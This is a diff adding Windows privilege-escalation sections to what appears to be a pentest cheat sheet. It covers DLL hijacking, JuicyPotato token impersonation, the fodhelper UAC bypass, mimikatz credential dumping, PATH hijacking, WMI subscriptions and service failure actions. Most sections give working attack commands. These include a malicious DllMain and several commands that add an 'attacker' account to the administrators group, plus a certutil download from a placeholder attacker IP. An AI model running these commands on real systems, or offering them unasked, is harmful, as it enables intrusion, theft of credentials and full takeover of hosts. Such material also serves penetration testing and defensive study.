@@ -1627,3 +1627,199 @@ Step	Action
 3.	Restart the service
 4.	Get SYSTEM shell or escalate privilege
  </details>
+<details>
+<summary>DLL Hijacking</summary>
+ <br>
+ </details>
+Exploits applications that load DLLs from directories writable by non-admin users. By placing a malicious DLL with the same name as one the app loads, you can achieve code execution as the application account (often SYSTEM).
+
+✅ Detection & Enumeration
+Use Procmon → Filter for “NAME NOT FOUND” on DLL loads.
+
+winPEAS → Check writable directories in program folders.
+
+Search for executable paths in registry or autoruns located in writable directories.
+
+🛠 Exploitation
+Identify target executable (foo.exe) in C:\Program Files\VulnerableApp\foo.exe.
+
+Check if that folder is writable:
+
+powershell
+
+    icacls "C:\Program Files\VulnerableApp"
+Craft a malicious DLL (e.g., example.dll) exporting expected functions with payload.
+
+    c
+
+    BOOL APIENTRY DllMain(...) {
+    system("cmd.exe /c net localgroup administrators attacker /add");
+    return TRUE;
+    }
+Compile with MinGW or MSVC; drop into target folder.
+
+Restart the application or service to trigger DLL loading.
+
+🧰 Tools & Alternatives
+Process Monitor (to trace DLL loading).
+
+PEVerify or DLL export readers (e.g. pexports).
+
+Testing environments: Place DLL as foo.dll or loadlib.dll.
+
+ <details>
+<summary>Token Impersonation (SeImpersonatePrivilege)</summary>
+ <br>
+  Users with the SeImpersonatePrivilege can impersonate generic tokens (e.g., service or scheduled tasks) and spawn a new process under SYSTEM or other privileged contexts.
+
+✅ Detection
+Run whoami /priv → check for SeImpersonatePrivilege (Enabled).
+
+Check group membership or local policy assignment via secpol.msc or AccessChk.
+
+🛠 Exploitation (JuicyPotato / PrintSpoofer etc.)
+Prepare the tool (compiled binary) for your architecture.
+
+On target VM:
+
+powershell
+
+    certutil -urlcache -f http://<attacker-ip>:8999/JuicyPotato.exe Juice.exe
+Run:
+
+powershell
+
+    .\Juice.exe -l 8080 -p \pipe\netlogon -t * -a calc.exe
+This spawns calc.exe (as SYSTEM). Replace with payload.
+
+🧰 Tools
+JuicyPotato / Rubeus / PrintSpoofer / RoguePotato
+
+AccessChk → to verify token rights.
+ </details>
+
+ <details>
+<summary> UAC Bypass Techniques</summary>
+ <br>
+  Certain executables in Windows auto-elevate (e.g. fodhelper.exe, eventvwr.exe). Abuse via registry modifications or DLL hijacking to bypass User Account Control.
+
+✅ Detection
+Enumerate auto-elevated executables using UACMe’s list.
+
+Check for registry keys in HKCU\Software\Classes\mscfile\shell\open\command.
+
+🛠 Steps (Using fodhelper.exe)
+Create .reg file on victim:
+
+    reg
+    Windows Registry Editor Version 5.00
+
+    [HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command]
+    "DelegateExecute"=""
+    "Default"="cmd.exe /c net localgroup administrators attacker /add"
+Run .reg file → merge.
+
+Launch:
+
+powershell
+
+    Start-Process fodhelper.exe
+Attack commands run elevated without prompt.
+
+🧰 Alternatives
+Techniques like eventvwr.exe, slui.exe, sdclt.exe, computerdefaults.exe.
+
+Tools: UACMe, BypassUACST.
+
+ </details>
+  <details>
+<summary> LSA Secrets & Credential Manager Extraction</summary>
+ <br>
+  Windows stores credentials in the LSA (LSA Secrets), Credential Manager, and DPAPI—exposing saved credentials or domain passwords.
+
+✅ Detection
+Access to system files: SAM, SECURITY, SYSTEM.
+
+User privileges: SeDebugPrivilege.
+
+🛠 Exploitation Steps
+Copy mimikatz.exe to target.
+
+Run elevated or under system token:
+
+powershell
+
+    mimikatz # privilege::debug
+    sekurlsa::logonpasswords
+Alternatively, credman::list to enumerate Credential Manager.
+
+🧰 Tools
+Mimikatz, LaZagne, CredDump, SecretsDump (Impacket).
+ </details>
+ <details>
+<summary>Writable PATH Directory Exploit</summary>
+ <br>
+  If any system PATH folder is writable by a non-admin user, executing a program without specifying full path may call a malicious binary in that folder first.
+
+✅ Detection
+powershell
+
+    echo $Env:PATH
+    icacls C:\Some\Writable\Path
+🛠 Exploitation
+Identify a writable PATH location, e.g. C:\Users\Public\Scripts.
+
+Drop cmd.exe or your attacker binary as net.exe into that folder.
+
+Run net or sc commands without full path. Windows loads your malicious binary.
+ </details>
+
+ <details>
+<summary>WMI Event Subscription (Filter/Consumer Hijack)</summary>
+ <br>
+  WMI event subscriptions (filters + consumers) can be hijacked if permissions allow — leading to persistent SYSTEM code execution.
+
+✅ Detection
+Query WMI:
+
+powershell
+
+    Get-WmiObject -Namespace root\subscription -Class __EventFilter
+    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
+Use wmisecexpire or WMISub tool to list subscriptions.
+
+🛠 Exploitation
+Create a malicious __EventConsumer and link via __FilterToConsumerBinding.
+
+Example:
+
+powershell
+
+    $consumer = New-Object -ComObject WbemScripting.SWbemObject
+    # Set properties to run payload
+    # Bind to Filter
+Trigger event → payload runs as SYSTEM.
+
+🧰 Tools
+wmiexec, WMISubHijack, WMIQuery.
+ </details>
+
+ <details>
+<summary>Service Failure Command Execution</summary>
+ <br>
+  Windows Service manager can execute a command upon failure using the FailureActions ACL. Weak permissions on a service config enable setting a SYSTEM-level failure handler.
+
+✅ Detection
+powershell
+
+    sc qfailure MyService
+🛠 Exploitation
+Modify failure action using:
+
+bash
+
+    sc failure MyService actions= restart/60000 ""/60000 cmd.exe /c "net localgroup administrators attacker /add"
+    sc failureflag MyService 1
+    sc stop MyService
+# let it fail twice to trigger
+ </details>
